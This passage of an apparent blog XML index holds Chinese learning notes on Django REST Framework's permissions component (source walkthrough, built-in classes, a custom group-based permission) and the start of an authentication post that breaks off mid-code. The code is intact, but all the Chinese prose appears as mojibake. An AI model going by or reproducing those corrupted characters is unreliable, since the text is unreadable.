          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂçÅ‰∫åÔºâÔºöÊùÉÈôêÁªÑ‰ª∂</title>
      <link href="/tech/drf-learning-notes-12-permissions/"/>
      <url>/tech/drf-learning-notes-12-permissions/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (12): Permissions</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†Å <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcGVybWlzc2lvbnMucHk=">rest_framework.permissions<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcGVybWlzc2lvbnMv">API Guide - Permissions<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEyX2RyZl9wZXJtaXNzaW9uLw==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><h2 id="ÂÖ•Âè£">ÂÖ•Âè£</h2><p>‰ªé<code>rest_framework.views.APIView</code>ÁöÑ<code>dispath(self, request, *args, **kwargs)</code>‰∏ãÊâãÔºå<code>dispath</code>ÊñπÊ≥ïÂÜÖ <code>self.initial(request, *args, **kwargs)</code> ËøõÂÖ•‰∏âÂ§ßËÆ§ËØÅ</p><ul><li>ËÆ§ËØÅÁªÑ‰ª∂ <code>self.perform_authentication(request)</code><ul><li>Ê†°È™åÁî®Êà∑ÔºöÊ∏∏ÂÆ¢„ÄÅÂêàÊ≥ïÁî®Êà∑„ÄÅÈùûÊ≥ïÁî®Êà∑</li><li>Ê∏∏ÂÆ¢Ôºö‰ª£Ë°®Ê†°È™åÈÄöËøáÔºåÁõ¥Êé•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÊùÉÈôêÊ†°È™åÔºâ</li><li>ÂêàÊ≥ïÁî®Êà∑Ôºö‰ª£Ë°®Ê†°È™åÈÄöËøáÔºåÂ∞ÜÁî®Êà∑Â≠òÂÇ®Âú®<code>request.user</code>‰∏≠ÔºåÂÜçËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÊùÉÈôêÊ†°È™åÔºâ</li><li>ÈùûÊ≥ïÁî®Êà∑Ôºö‰ª£Ë°®Ê†°È™åÂ§±Ë¥•ÔºåÊäõÂá∫ÂºÇÂ∏∏ÔºåËøîÂõû403ÊùÉÈôêÂºÇÂ∏∏ÁªìÊûú</li></ul></li><li>ÊùÉÈôêÁªÑ‰ª∂ <code>self.check_permissions(request)</code><ul><li>Ê†°È™åÁî®Êà∑ÊùÉÈôêÔºöÂøÖÈ°ªÁôªÂΩï„ÄÅÊâÄÊúâÁî®Êà∑„ÄÅÁôªÂΩï‰πãÂêéËØªÂÜôÔºåÊ∏∏ÂÆ¢Âè™ËØª„ÄÅËá™ÂÆö‰πâÁî®Êà∑ËßíËâ≤</li><li>ËÆ§ËØÅÈÄöËøáÔºöÂèØ‰ª•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÈ¢ëÁéáËÆ§ËØÅÔºâ</li><li>ËÆ§ËØÅÂ§±Ë¥•ÔºöÊäõÂá∫ÂºÇÂ∏∏ÔºåËøîÂõû403ÊùÉÈôêÂºÇÂ∏∏ÁªìÊûú</li></ul></li><li>È¢ëÁéáÁªÑ‰ª∂ <code>self.check_throttles(request)</code><ul><li>ÈôêÂà∂ËßÜÂõæÊé•Âè£Ë¢´ËÆøÈóÆÁöÑÈ¢ëÁéáÊ¨°Êï∞ - ÈôêÂà∂ÁöÑÊù°‰ª∂(IP„ÄÅid„ÄÅÂîØ‰∏ÄÈîÆ)„ÄÅÈ¢ëÁéáÂë®ÊúüÊó∂Èó¥(s„ÄÅm„ÄÅh)„ÄÅÈ¢ëÁéáÁöÑÊ¨°Êï∞Ôºà3/sÔºâ</li><li>Ê≤°ÊúâËææÂà∞ÈôêÊ¨°ÔºöÊ≠£Â∏∏ËÆøÈóÆÊé•Âè£</li><li>ËææÂà∞ÈôêÊ¨°ÔºöÈôêÂà∂Êó∂Èó¥ÂÜÖ‰∏çËÉΩËÆøÈóÆÔºåÈôêÂà∂Êó∂Èó¥ËææÂà∞ÂêéÔºåÂèØ‰ª•ÈáçÊñ∞ËÆøÈóÆ</li></ul></li></ul><p>Êú¨Êñá‰ªãÊùÉÈôêÁªÑ‰ª∂„ÄÇ</p><h2 id="rest_framework.views.apiview.initial">rest_framework.views.APIView.initial()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">        neg = self.perform_content_negotiation(request)</span><br><span class="line">        request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">        version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">        request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">        self.perform_authentication(request) </span><br><span class="line">        self.check_permissions(request)  <span class="comment"># ÊùÉÈôê</span></span><br><span class="line">        self.check_throttles(request)</span><br></pre></td></tr></table></figure><h2 id="rest_framework.views.apiview.check_permissions">rest_framework.views.APIView.check_permissions()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_permissions</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    <span class="comment"># ÈÅçÂéÜÊùÉÈôêÂØπË±°ÂàóË°®ÂæóÂà∞‰∏Ä‰∏™‰∏™ÊùÉÈôêÂØπË±°(ÊùÉÈôêÂô®)ÔºåËøõË°åÊùÉÈôêËÆ§ËØÅ</span></span><br><span class="line">    <span class="keyword">for</span> permission <span class="keyword">in</span> self.get_permissions():</span><br><span class="line">        <span class="comment"># ÊùÉÈôêÁ±ª‰∏ÄÂÆöÊúâ‰∏Ä‰∏™has_permissionÊùÉÈôêÊñπÊ≥ïÔºåÁî®Êù•ÂÅöÊùÉÈôêËÆ§ËØÅÁöÑ</span></span><br><span class="line">        <span class="comment"># ÂèÇÊï∞ÔºöÊùÉÈôêÂØπË±°self„ÄÅËØ∑Ê±ÇÂØπË±°request„ÄÅËßÜÂõæÁ±ªÂØπË±°</span></span><br><span class="line">        <span class="comment"># ËøîÂõûÂÄºÔºöÊúâÊùÉÈôêËøîÂõûTrueÔºåÊó†ÊùÉÈôêËøîÂõûFalse</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> permission.has_permission(request, self):</span><br><span class="line">            self.permission_denied(</span><br><span class="line">                request, message=getattr(permission, <span class="string">'message'</span>, <span class="literal">None</span>)</span><br><span class="line">            )</span><br></pre></td></tr></table></figure><h2 id="rest_framework.views.apiview.get_permissions">rest_framework.views.APIView.get_permissions()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_permissions</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Instantiates and returns the list of permissions that this view requires.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [permission() <span class="keyword">for</span> permission <span class="keyword">in</span> self.permission_classes]</span><br></pre></td></tr></table></figure><h2 id="rest_framework.views.permission_classes">rest_framework.views.permission_classes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission_classes = api_settings.DEFAULT_PERMISSION_CLASSES</span><br></pre></td></tr></table></figure><h2 id="api_settings.default_permission_classes">api_settings.DEFAULT_PERMISSION_CLASSES</h2><p>ÊåáÂêë <code>settings.DEFAULTS</code>ÁöÑ<code>DEFAULT_PERMISSION_CLASSES</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEFAULTS = &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'DEFAULT_PERMISSION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.permissions.AllowAny'</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><h2 id="pemissions.py">pemissions.py</h2><p>Âú®Ê∫êÁ†Å<code>permissions.py</code>‰∏≠ÁöÑÁ≥ªÁªüËá™Â∏¶ÊùÉÈôêÁ±ªÔºåËøôÈáå‰∏æ‰æãÂõõ‰∏™</p><ol type="1"><li><code>AllowAny</code><ul><li>ÈªòËÆ§ÊòØËøô‰∏™ÊùÉÈôê</li><li>ËÆ§ËØÅËßÑÂàôÂÖ®ÈÉ®ËøîËøò<code>True</code>Ôºö<code>return True</code></li><li>Ê∏∏ÂÆ¢‰∏éÁôªÈôÜÁî®Êà∑ÈÉΩÊúâÊâÄÊúâÊùÉÈôê</li></ul></li><li>IsAuthenticated<ul><li>Â∏∏Áî®Ëøô‰∏™</li><li>ËÆ§ËØÅËßÑÂàôÂøÖÈ°ªÊúâÁôªÈôÜÁöÑÂêàÊ≥ïÁî®Êà∑Ôºö<code>return bool(request.user and request.user.is_authenticated)</code></li><li>ÊúâÁôªÂΩïÁî®Êà∑ÂêçÂπ∂‰∏îËÆ§ËØÅÊàêÂäü</li><li>Ê∏∏ÂÆ¢Ê≤°Êúâ‰ªª‰ΩïÊùÉÈôêÔºåÁôªÈôÜÁî®Êà∑ÊâçÊúâÊùÉÈôê</li></ul></li><li>IsAdminUser<ul><li>ËÆ§ËØÅËßÑÂàôÂøÖÈ°ªÊòØÂêéÂè∞ÁÆ°ÁêÜÁî®Êà∑Ôºö<code>return bool(request.user and request.user.is_staff)</code></li><li>Ê∏∏ÂÆ¢Ê≤°Êúâ‰ªª‰ΩïÊùÉÈôêÔºåÁôªÈôÜÁî®Êà∑ÊâçÊúâÊùÉÈôê</li></ul></li><li>IsAuthenticatedOrReadOnly<ul><li>ËÆ§ËØÅËßÑÂàôÂøÖÈ°ªÊòØÂè™ËØªËØ∑Ê±ÇÊàñÊòØÂêàÊ≥ïÁî®Êà∑ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> bool(</span><br><span class="line">    request.method <span class="keyword">in</span> SAFE_METHODS <span class="keyword">or</span></span><br><span class="line">    request.user <span class="keyword">and</span></span><br><span class="line">    request.user.is_authenticated</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li>Ê∏∏ÂÆ¢Âè™ËØªÔºåÂêàÊ≥ïÁî®Êà∑Êó†ÈôêÂà∂</li></ul></li></ol><p>Âè¶Â§ñÔºå<code>permission.py</code>ÈáåËøòÂÆö‰πâ‰∫ÜÂÆâÂÖ®ÁöÑHTTPËØ∑Ê±ÇÊñπÊ≥ïÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SAFE_METHODS = (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>)</span><br></pre></td></tr></table></figure><h1 id="ÊùÉÈôêÁªÑ‰ΩøÁî®">ÊùÉÈôêÁªÑ‰ΩøÁî®</h1><h2 id="ÂÖ®Â±Ä‰ΩøÁî®">ÂÖ®Â±Ä‰ΩøÁî®</h2><p>ÈªòËÆ§ÂÖ®Â±ÄÈÖçÁΩÆÁöÑÊùÉÈôêÁ±ªÊòØ<code>AllowAny</code>ÔºåÂú®<code>settings</code>Êñá‰ª∂‰∏≠ÈÖçÁΩÆÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># ÊùÉÈôêÁ±ªÈÖçÁΩÆ</span></span><br><span class="line">    <span class="string">'DEFAULT_PERMISSION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.permissions.AllowAny'</span>,   <span class="comment">#ÈªòËÆ§ÊâÄÊúâÊùÉÈôê</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Â±ÄÈÉ®‰ΩøÁî®">Â±ÄÈÉ®‰ΩøÁî®</h2><p><code>views.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Âè™ÊúâÁôªÂΩïÂêéÊâçËÉΩËÆøÈóÆ</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAuthenticatedAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'test ÁôªÂΩïÊâçËÉΩËÆøÈóÆÁöÑÊé•Âè£ ok'</span>)</span><br></pre></td></tr></table></figure><h1 id="Ëá™ÂÆö‰πâÊùÉÈôêÁ±ª">Ëá™ÂÆö‰πâÊùÉÈôêÁ±ª</h1><h2 id="ÊñπÊ≥ï">ÊñπÊ≥ï</h2><ol type="1"><li>ÂàõÂª∫ÁªßÊâøBasePermissionÁöÑÊùÉÈôêÁ±ª</li><li>ÂÆûÁé∞has_permissionÊñπÊ≥ï</li><li>ÂÆûÁé∞‰ΩìÊ†πÊçÆÊùÉÈôêËßÑÂàô Á°ÆÂÆöÊúâÊó†ÊùÉÈôê<ul><li>Êª°Ë∂≥ËÆæÁΩÆÁöÑÁî®Êà∑Êù°‰ª∂Ôºå‰ª£Ë°®ÊúâÊùÉÈôêÔºåËøîÂõûTrue</li><li>‰∏çÊª°Ë∂≥ËÆæÁΩÆÁöÑÁî®Êà∑Êù°‰ª∂Ôºå‰ª£Ë°®ÊúâÊùÉÈôêÔºåËøîÂõûFalse</li></ul></li><li>ËøõË°åÂÖ®Â±ÄÊàñÂ±ÄÈÉ®ÈÖçÁΩÆ</li></ol><h2 id="Á§∫‰æã‰ª£Á†Å">Á§∫‰æã‰ª£Á†Å</h2><h3 id="utils.permissions.py">utils.permissions.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> BasePermission</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> Group</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPermission</span><span class="params">(BasePermission)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_permission</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="comment"># Âè™ËØªÊé•Âè£Âà§Êñ≠</span></span><br><span class="line">        r1 = request.method <span class="keyword">in</span> (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>)</span><br><span class="line">        <span class="comment"># group‰∏∫ÊúâÊùÉÈôêÁöÑÂàÜÁªÑ</span></span><br><span class="line">        group = Group.objects.filter(name=<span class="string">'ÁÆ°ÁêÜÂëò'</span>).first()</span><br><span class="line">        <span class="comment"># groups‰∏∫ÂΩìÂâçÁî®Êà∑ÊâÄÂ±ûÁöÑÊâÄÊúâÂàÜÁªÑ</span></span><br><span class="line">        groups = request.user.groups.all()</span><br><span class="line">        r2 = group <span class="keyword">and</span> groups <span class="comment"># groupÂíågroupsÂøÖÈ°ªÊúâÂÄº</span></span><br><span class="line">        r3 = group <span class="keyword">in</span> groups</span><br><span class="line">        <span class="comment"># ËØªÊé•Âè£Â§ßÂÆ∂ÈÉΩÊúâÊùÉÈôêÔºåÂÜôÊé•Âè£ÂøÖÈ°ª‰∏∫ÊåáÂÆöÂàÜÁªÑ‰∏ãÁöÑÁôªÈôÜÁî®Êà∑</span></span><br><span class="line">        <span class="keyword">return</span> r1 <span class="keyword">or</span> (r2 <span class="keyword">and</span> r3)</span><br></pre></td></tr></table></figure><h3 id="views.py">views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> utils.permissions <span class="keyword">import</span> MyPermission</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ê∏∏ÂÆ¢Âè™ËØªÔºåÁôªÂΩïÁî®Êà∑Âè™ËØªÔºåÂè™ÊúâÁôªÂΩïÁî®Êà∑Â±û‰∫é ÁÆ°ÁêÜÂëò ÂàÜÁªÑÔºåÊâçÂèØ‰ª•Â¢ûÂà†Êîπ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAdminOrReadOnlyAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    permission_classes = [MyPermission]</span><br><span class="line">    <span class="comment"># ÊâÄÊúâÁî®Êà∑ÈÉΩÂèØ‰ª•ËÆøÈóÆ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'Ëá™ÂÆö‰πâËØª OK'</span>)</span><br><span class="line">    <span class="comment"># ÂøÖÈ°ªÊòØ Ëá™ÂÆö‰πâ‚ÄúÁÆ°ÁêÜÂëò‚ÄùÂàÜÁªÑ ‰∏ãÁöÑÁî®Êà∑</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'Ëá™ÂÆö‰πâÂÜô OK'</span>)</span><br></pre></td></tr></table></figure><h3 id="urls.py">urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'test3/'</span>, views.TestAdminOrReadOnlyAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="postmanÊµãËØï">PostmanÊµãËØï</h2><ul><li><code>get</code>ËØ∑Ê±ÇÔºöÂä†‰∏çÂä†<code>Authorization</code>ÔºåÈÉΩÂèØ‰ª•ËØª</li><li><code>post</code>ËØ∑Ê±ÇÔºö‰∏çÂä†<code>Authorization</code>ÔºåÂ∞±‰∏çËÉΩËøõË°åÂÜôÊìç‰ΩúÔºåÂøÖÈ°ªË¶ÅÂÜô<code>Authorization</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂçÅ‰∏ÄÔºâÔºöËÆ§ËØÅÁªÑ‰ª∂</title>
      <link href="/tech/drf-learning-notes-11-authentication/"/>
      <url>/tech/drf-learning-notes-11-authentication/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (11): Authentication</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†Å <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvYXV0aGVudGljYXRpb24ucHk=">rest_framework.authentication<i class="fa fa-external-link-alt"></i></span></li><li>ÂÆòÊñπÊñáÊ°£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvYXV0aGVudGljYXRpb24v">API Guide - Authentication<i class="fa fa-external-link-alt"></i></span></li><li>Êú¨Êñádemo‰ª£Á†ÅGithub<ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzExX2RyZl9hdXRoZW50aWNhdGlvbi8=">Ëá™ÂÆö‰πâËÆ§ËØÅÁ±ª<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzExX2RyZl9qd3Qv">jwt &amp; simple-jwt<i class="fa fa-external-link-alt"></i></span></li></ul></li></ul><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><h2 id="ÂÖ•Âè£">ÂÖ•Âè£</h2><p>‰ªé<code>rest_framework.views.APIView</code>ÁöÑ<code>dispath(self, request, *args, **kwargs)</code>‰∏ãÊâã Ôºå<code>dispath</code>ÊñπÊ≥ïÂÜÖ <code>self.initial(request, *args, **kwargs)</code> ËøõÂÖ•‰∏âÂ§ßËÆ§ËØÅ</p><ul><li>ËÆ§ËØÅÁªÑ‰ª∂ <code>self.perform_authentication(request)</code><ul><li>Ê†°È™åÁî®Êà∑ÔºöÊ∏∏ÂÆ¢„ÄÅÂêàÊ≥ïÁî®Êà∑„ÄÅÈùûÊ≥ïÁî®Êà∑</li><li>Ê∏∏ÂÆ¢Ôºö‰ª£Ë°®Ê†°È™åÈÄöËøáÔºåÁõ¥Êé•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÊùÉÈôêÊ†°È™åÔºâ</li><li>ÂêàÊ≥ïÁî®Êà∑Ôºö‰ª£Ë°®Ê†°È™åÈÄöËøáÔºåÂ∞ÜÁî®Êà∑Â≠òÂÇ®Âú®<code>request.user</code>‰∏≠ÔºåÂÜçËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÊùÉÈôêÊ†°È™åÔºâ</li><li>ÈùûÊ≥ïÁî®Êà∑Ôºö‰ª£Ë°®Ê†°È™åÂ§±Ë¥•ÔºåÊäõÂá∫ÂºÇÂ∏∏ÔºåËøîÂõû403ÊùÉÈôêÂºÇÂ∏∏ÁªìÊûú</li></ul></li><li>ÊùÉÈôêÁªÑ‰ª∂ <code>self.check_permissions(request)</code><ul><li>Ê†°È™åÁî®Êà∑ÊùÉÈôêÔºöÂøÖÈ°ªÁôªÂΩï„ÄÅÊâÄÊúâÁî®Êà∑„ÄÅÁôªÂΩï‰πãÂêéËØªÂÜôÔºåÊ∏∏ÂÆ¢Âè™ËØª„ÄÅËá™ÂÆö‰πâÁî®Êà∑ËßíËâ≤</li><li>ËÆ§ËØÅÈÄöËøáÔºöÂèØ‰ª•ËøõÂÖ•‰∏ã‰∏ÄÊ≠•Ê†°È™åÔºàÈ¢ëÁéáËÆ§ËØÅÔºâ</li><li>ËÆ§ËØÅÂ§±Ë¥•ÔºöÊäõÂá∫ÂºÇÂ∏∏ÔºåËøîÂõû403ÊùÉÈôêÂºÇÂ∏∏ÁªìÊûú</li></ul></li><li>È¢ëÁéáÁªÑ‰ª∂ <code>self.check_throttles(request)</code><ul><li>ÈôêÂà∂ËßÜÂõæÊé•Âè£Ë¢´ËÆøÈóÆÁöÑÈ¢ëÁéáÊ¨°Êï∞ - ÈôêÂà∂ÁöÑÊù°‰ª∂(IP„ÄÅid„ÄÅÂîØ‰∏ÄÈîÆ)„ÄÅÈ¢ëÁéáÂë®ÊúüÊó∂Èó¥(s„ÄÅm„ÄÅh)„ÄÅÈ¢ëÁéáÁöÑÊ¨°Êï∞Ôºà3/sÔºâ</li><li>Ê≤°ÊúâËææÂà∞ÈôêÊ¨°ÔºöÊ≠£Â∏∏ËÆøÈóÆÊé•Âè£</li><li>ËææÂà∞ÈôêÊ¨°ÔºöÈôêÂà∂Êó∂Èó¥ÂÜÖ‰∏çËÉΩËÆøÈóÆÔºåÈôêÂà∂Êó∂Èó¥ËææÂà∞ÂêéÔºåÂèØ‰ª•ÈáçÊñ∞ËÆøÈóÆ</li></ul></li></ul><p>Êú¨Êñá‰ªãÁªçËÆ§ËØÅÁªÑ‰ª∂„ÄÇ</p><h2 id="rest_framework.views.apiview.initial">rest_framework.views.APIView.initial()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">        neg = self.perform_content_negotiation(request)</span><br><span class="line">        request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">        version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">        request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">        